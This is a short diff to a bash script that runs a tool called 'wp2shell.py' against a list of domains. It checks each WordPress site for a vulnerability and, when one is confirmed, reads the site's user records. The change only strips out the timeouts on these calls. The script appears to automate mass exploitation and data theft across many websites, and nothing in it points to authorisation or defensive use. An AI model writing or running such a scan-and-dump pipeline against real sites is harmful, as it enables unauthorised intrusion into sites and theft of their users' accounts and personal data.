@@ -30,7 +30,7 @@ scan_one() {
   local domain="$1"
   local check_result
 
-  check_result=$(timeout 60 python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)
+  check_result=$(python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)
 
   if ! echo "$check_result" | grep -q "CONFIRMED\|VULNERABLE"; then
     echo "⚪ $domain — not vulnerable"
@@ -41,7 +41,7 @@ scan_one() {
   echo "🔴 $domain — CONFIRMED, reading users..."
 
   local users_result
-  users_result=$(timeout 300 python3 "$SCRIPT_DIR/wp2shell.py" read "https://$domain" --preset users 2>&1)
+  users_result=$(python3 "$SCRIPT_DIR/wp2shell.py" read "https://$domain" --preset users 2>&1)
 
   local users_clean
   users_clean=$(echo "$users_result" | grep -E '^\s+[0-9]+\|' \
